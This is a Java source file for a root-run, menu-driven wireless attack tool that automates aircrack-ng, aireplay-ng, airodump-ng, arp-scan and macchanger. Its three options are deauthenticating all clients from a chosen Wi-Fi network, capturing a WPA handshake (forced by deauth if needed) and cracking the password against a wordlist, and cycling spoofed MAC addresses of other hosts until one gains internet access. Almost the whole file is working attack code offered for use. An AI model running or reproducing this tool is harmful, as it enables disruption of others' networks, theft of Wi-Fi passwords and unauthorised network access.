package com.koursh.inbar;


import java.io.*;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Objects;
import java.util.Scanner;

/**
 * UIAS Script
 */

class Main {
    /**
     * Scanner used to read user input
     */
    private static final Scanner scanner = new Scanner(System.in);
    /**
     * Wireless Interface
     */
    private static String wi = "wlp5s0";
    /**
     * Wireless Interface in monitor mode
     */
    private static String mwi = wi + "mon";
    /**
     * Has monitor mode been started by script
     */
    private static boolean monitorMde = false;
    /**
     * Script JAR file directory
     */
    private static String scriptDIR;

    /**
     * UIAS interface
     * @param args arg s is given so the script will only run setup and not start
     * @throws IOException error
     * @throws URISyntaxException error
     */
    public static void main(String[] args) throws IOException, URISyntaxException {
        if (System.getProperty("os.name").startsWith("Windows")) {
            System.out.println("Sorry, windows isn't supported yet, please run from a vm.");
            System.exit(0);
        } else if (System.getProperty("os.name").startsWith("mac")) {
            System.out.println("Sorry, macOS isn't supported yet, please run from a vm.");
            System.exit(0);
        } //ensure that this is run on linux

        String path = new File(Main.class.getProtectionDomain().getCodeSource().getLocation()
                .toURI()).getPath(); //get jar file path

        if (!execute("whoami", false).get(0).equals("root")) {
            System.out.println("run it as root");
            executeNewWindow("sudo java -jar " + path, false);
            System.exit(0);
        } //ensure that this script is run with su privileges

        checkdep(); //check that necessary dependencies are installed

        File wireless_interface_file = new File("WI"); //wireless interface name file
        if(!wireless_interface_file.exists()){ //if file doesn't exist, create it and write wireless interface and monitor wireless interface to it
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(wireless_interface_file));
            System.out.println("Enter wireless interface name in managed (normal) mode");
            bufferedWriter.write(scanner.nextLine());
            bufferedWriter.newLine();
            System.out.println("Enter wireless interface name in monitor mode");
            bufferedWriter.write(scanner.nextLine());
            bufferedWriter.close();
        }
        BufferedReader bufferedReader = new BufferedReader(new FileReader(wireless_interface_file)); //read wireless interface
        wi = bufferedReader.readLine();
        mwi = bufferedReader.readLine();

        if (args.length > 0) { //if script is run in setup mode (called by script) quit
            if (Objects.equals(args[0], "s"))
                System.exit(0);
        }



        scriptDIR = path.replace(path.split(File.separator)[path.split(File.separator).length - 1], ""); //get jar file dir


        System.out.println("Success! PUIAS has been successfully started ");
        String in = "";

        while (!in.equals("exit")) {

            System.out.println("----------------------------------------------------"); //print options
            System.out.println("|Hello what would you like to do today?            |");
            System.out.println("|                                                  |");
            System.out.println("|                                                  |");
            System.out.println("|edit - edit wireless card name (currently: " + wi + ")|");
            System.out.println("|                                                  |");
            System.out.println("| 1 - launch deauth attack                         |");
            System.out.println("| 2 - launch WPA attack                            |");
            System.out.println("| 3 - launch MAC spoofing attack                   |");
            System.out.println("|                                                  |");
            System.out.println("| exit - exit (really?)                            |");
            System.out.println("----------------------------------------------------");

            in = scanner.nextLine();

            if (in.equals("edit")) { //change wireless card name
                wireless_interface_file.delete();
                System.exit(0);
            }
            if (in.equals("1")) { //deauth mode
                String[] network = getNetwork(); //get network to deauth
                String bss = network[0];
                @SuppressWarnings("unused") String ess = network[1];
                String ch = network[2];


                System.out.println("Only deauth all is currently supported, press 1 to confirm");
                String p = scanner.nextLine();

                if (p.equals("1")) {
                    setChanel(ch); //set chanel
                    executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true); //run deauth
                    System.out.println("press enter when done"); //wait until deauth is done
                    scanner.nextLine();
                }

                //TODO: add targeted deauth

//                if (p.equals("2")) {

//                }
                stopMonitorMode();
            }
            if (in.equals("2")) {//wpa attack mode
                String[] network = getNetwork(); //get target network
                String bss = network[0];
                //noinspection unused
                String ess = network[1];
                String ch = network[2];

                executeNewWindow("airodump-ng -c " + ch + " -w " + scriptDIR + "tg" + File.separator + "tg" + " --bssid " + bss + " " + mwi, true); //get networks 4-way handshake

                System.out.println("attempt to de-auth clients? ");//to force handshake deauth may be used
                if (scanner.nextLine().toLowerCase().equals("y")) {
                    executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true); //run de-auth
                }

                System.out.println("press enter when done"); //wait until handshake file is created
                scanner.nextLine();

                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                File[] tgscans = new File(scriptDIR + "tg").listFiles(pathname -> pathname.getAbsolutePath().endsWith("cap"));
                assert tgscans != null;
                Arrays.sort(tgscans);
                File lasttg_scan = tgscans[tgscans.length - 1]; //get the latest scan

                execute("chmod 777 " + lasttg_scan.getAbsolutePath(), true); //allow editing of file
                System.out.println("got handshake");

                String passwd_list = getPasswordList();

                System.out.println("aircrack-ng -l netpass -w " + passwd_list + " -b " + bss + " " + lasttg_scan.getAbsolutePath());

                executeNewWindow("aircrack-ng -l netpass -w " + passwd_list + " -b " + bss + " " + lasttg_scan.getAbsolutePath(), true); //crack password and save password to file
                //TODO: add john the ripper custom password list generation

                System.out.println("press enter when done");//wait for aircrack
                scanner.nextLine();

                try {
                    File pass = new File("netpass");
                    BufferedReader npassbr = new BufferedReader(new FileReader(pass));
                    System.out.println("Password: " + npassbr.readLine());//print password
                    npassbr.close();

                    //noinspection ResultOfMethodCallIgnored
                    pass.delete();
                    BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(pass));
                    bufferedWriter.write("Error"); //write error in file so if next time aircrack is quit before it found the password no password would be returned

//                execute(scriptDIR+"hashcat-utils-master/src/cap2hccapx.bin "+lasttg_scan.getAbsolutePath()+" "+lasttg_scan.getAbsolutePath().replace(".cap",".hccapx"),false);
//TODO: add gpu cracking support with hashcat
                } catch (Exception ignored){System.out.println("Error");}

                stopMonitorMode();//exit monitor mode

            }
            if (in.equals("3")) {
                ArrayList<String> macs = execute("arp-scan -l", true); //get all mac addresses via arp-scan
                macs.remove(0); //remove headers
                macs.remove(0);
                macs.remove(macs.size() - 1);
                macs.remove(macs.size() - 1);
                macs.remove(macs.size() - 1);
                System.out.println(macs.size() + " possible targets found: ");
                for (int i = 0; i < macs.size(); i++) {
                    macs.set(i, macs.get(i).split("\t")[1]); //add mac to arraylist
                    System.out.println(macs.get(i)); //print said mac
                }
                for (String mac : macs) {
                    if (trymac(mac)) { //try each mac
                        System.out.println("success! " + mac); //mac successful, print it
                        break;
                    }
                }

            }
        }
    }

    /**
     * Get a password list
     * @return selected password list
     */
    private static String getPasswordList() {
        File lists = new File("passwd_lists");
        File[] files = lists.listFiles();
        int i=0;
        System.out.println("Select password list: ");
        for(File l: Objects.requireNonNull(files)){
            i++;
            System.out.println(i+") "+l.getName());
        }
        String pl =scanner.nextLine();
//        if(pl.equals("c")){
//
//        }
        return files[Integer.parseInt(pl)-1].getAbsolutePath();
    }

    /**
     * Get details about network to attack
     * @return bssid, essid, chanel
     * @throws IOException error
     */

    private static String[] getNetwork() throws IOException {
        startMonitorMode();
        String scans_path = scriptDIR + "scans" + File.separator + "scans"; //deauth initial scan absolote path
        executeNewWindow("airodump-ng  -w " + scans_path + " --output-format csv " + mwi, true);//scan networks and get bssid and essid
        System.out.println("press enter when done");
        scanner.nextLine();


        File[] scans = new File(scriptDIR + "scans").listFiles(pathname -> !pathname.isDirectory());
        assert scans != null;
        Arrays.sort(scans);
        File last_scan = scans[scans.length - 1]; //get the latest scan

        execute("chmod 777 " + last_scan.getAbsolutePath(), true); //allow editing of file


        BufferedReader scansbr = new BufferedReader(new FileReader(last_scan));
        String l;
        ArrayList<String> dsi_list = new ArrayList<>();
        while (!(l = scansbr.readLine()).equals("Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs")) {//read file until reched unasosiated bssids
            dsi_list.add(l);
        }
        dsi_list.remove(0); //remove headers
        dsi_list.remove(0);

        ArrayList<String> bssids = new ArrayList<>();
        ArrayList<String> essids = new ArrayList<>();
        ArrayList<String> chs = new ArrayList<>();

        int i = 0;
        for (String entry : dsi_list) { //go over each entry and extract properies
            try {
                String[] props = entry.split(",");
                chs.add(props[3].replace(" ", ""));
                bssids.add(props[0]);
                String essid = props[props.length - 2];  // essid is 1 before the last
                essids.add(essid);
                System.out.println(i + ". " + essid);

                i++;
            } catch (Exception ignored) {
            }

        }
        scansbr.close();
        System.out.println("enter network no");

        int sn = Integer.parseInt(scanner.nextLine()); //get properties for selected network
        String bss = bssids.get(sn);
        String ess = essids.get(sn);
        String ch = chs.get(sn);
        System.out.println("Selected network: " + ess + " with a bssid: " + bss + " and a chanel: " + ch);
        return new String[]{bss, ess, ch};
    }

    /**
     * Put wireless interface in monitor mode
     */
    private static void startMonitorMode() {
        if (!monitorMde) { //if monitor mode is disabled
            execute("airmon-ng check kill", true); //kill all processes that could interfere with monitor mode
            execute("airmon-ng start " + wi, true); //start monitor mode
            monitorMde = true;
        }
    }

    /**
     * Set monitor wireless card chanel
     * @param ch chanel to set
     */
    private static void setChanel(String ch) {
        if (monitorMde){
        execute("sudo iwconfig " + mwi + " channel " + ch, true); //set monitor wireless card chanel
             }
    }

    /**
     * Revert wireless interface into standard mode
     */

    private static void stopMonitorMode() {
        if (monitorMde) {
            execute("airmon-ng stop " + mwi, true);//stop monitor mode
            execute("service network-manager restart", true);//restart networking service
            monitorMde = false;
        }
    }

    /**
     * Check that the programs dependencies are installed - otherwise prompt the user to install the programs dependencies and quit
     * @throws IOException error
     */

    private static void checkdep() throws IOException {
        System.out.println("checking dep");
        boolean aircrack = checkpackage("aircrack-ng"); //check each package if installed
        boolean macchanger = checkpackage("macchanger");
        boolean arpscan = checkpackage("arp-scan");
        boolean pkexec = checkpackage("pkexec");


        if (!macchanger || !aircrack || !arpscan || !pkexec) {//if any package is missing
            System.out.println("Error, some of the application requirements are missing");

            File dep = new File("dep.sh");
            //noinspection ResultOfMethodCallIgnored
            dep.delete(); //delete existing dep.sh file
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(dep));
            bufferedWriter.write("#!/bin/sh"); //create a new bash script


            if (!pkexec) { //for each missing package push an install line
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install pkexec");
            }
            if (!macchanger) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install macchanger");
            }
            if (!arpscan) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install arp-scan");
            }
            if (!aircrack) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install aircrack-ng");
            }
            bufferedWriter.close();
            System.out.println("please run: 'chmod +x dep.sh' and 'sudo bash dep.sh' (two commands, no quotes)"); //print execution instructions
            System.exit(0);
        }
    }


    /**
     * Check that a certain package dependency is installed
     * @param packageS package to check
     * @return weather the package is installed
     */

    private static boolean checkpackage(String packageS) {
        ArrayList<String> pkg_stat = execute("which " + packageS, false); //check if package is installed via which command
        boolean installed = pkg_stat.size() > 0;
        System.out.println(packageS + (installed ? " [OK]" : "[!]")); //print data accordingly
        return installed;
    }


    /**
     * Run a bash command
     * @param command command to execute
     * @param sudo whether to execute as root
     * @return ArrayList of output - each entry is a line <p>note that first std:out is read, then std:error</p>
     */
    private static ArrayList<String> execute(String command, boolean sudo) {
        if (sudo) {
            command = "pkexec " + command; // if sudo is required append pkexec to the start(graphical request for sudo)
        }


        ArrayList<String> out = new ArrayList<>();
        try {
            Process p = new ProcessBuilder("/bin/sh", "-c", command).start(); //create process from command

            p.waitFor(); //wait for process to complete

            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); //std::out buferdreader output
            BufferedReader error = new BufferedReader(new InputStreamReader(p.getErrorStream())); //std::error buferdreader output

            String s;
            while ((s = br.readLine()) != null) //first read all std::output and append to result
                out.add(s);
            while ((s = error.readLine()) != null)//then do the same for std error
                out.add(s);

            p.destroy();//quit process

            br.close();//close readers
            error.close();
        } catch (Exception ignored) {
        }
        return out;
    }

    /**
     * Execute command in a window that can be interacted with by the user
     * @param command command to execute
     * @param sudo whether to execute as root
     */

    private static void executeNewWindow(String command, boolean sudo) {
        if (sudo) { //pkexce doesn't work well with terminal
            execute("sudo x-terminal-emulator -e " + command, false); //execute command in a new terminal
            return; //terminal doesn't return output
        }
        execute("x-terminal-emulator -e " + command, false);//execute command in a new terminal
    }

    /**
     * Change wireless interface mac address
     * @param mac new mac address
     */

    private static void change_mac(String mac) {
        execute("ifconfig " + wi + " down && pkexec macchanger -m " + mac + " " + wi + "&& pkexec ifconfig " + wi + " up", true);//bring down the network card, change mac, bring it back up

        execute("nmcli radio wifi off", true);//restart network adapter
        execute("nmcli radio wifi on", true);
    }

    /**
     * Detect if a mac address can access the internet
     * @param mac mac address to try
     * @return if mac has internet access
     */
    private static boolean trymac(String mac) {
        change_mac(mac); //change mac address
        boolean conected = false; //try 5 times to check connection to network
        for (int i = 0; i < 5 || conected; i++) {
            conected = !execute("ping 8.8.8.8 -c 4", false).contains("connect: Network is unreachable");
        }
        ArrayList<String> ping = execute("ping 8.8.8.8 -c 6", false); //ping google dns server and return !( if packet loss was 100% or ping failed)
        System.out.println(ping);
        return !(ping.contains("100% packet loss") || ping.contains("connect: Network is unreachable"));
    }


}